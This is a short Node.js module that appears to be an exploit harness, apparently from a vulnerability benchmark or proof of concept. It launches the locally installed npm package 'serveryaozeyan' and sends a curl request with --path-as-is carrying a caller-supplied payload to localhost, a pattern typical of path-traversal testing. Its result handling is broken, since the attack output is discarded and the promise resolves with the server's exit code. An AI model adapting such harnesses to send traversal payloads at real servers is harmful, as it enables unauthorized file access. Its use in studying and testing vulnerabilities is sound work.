function exploitFunction(payload) {
  const { exec } = require("child_process");
  const server = "node ./node_modules/serveryaozeyan/index.js";
  let exe = exec(server, (error, stdout) => {
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    exec(attack_string, (error, stdout) => {
      return stdout; // Return the stdout directly
    });
  });

  return new Promise((resolve, reject) => {
    exe.on("exit", (code) => {
      resolve(code); // Resolve the promise with the exit code
    });
  });
}

module.exports = { exploitFunction };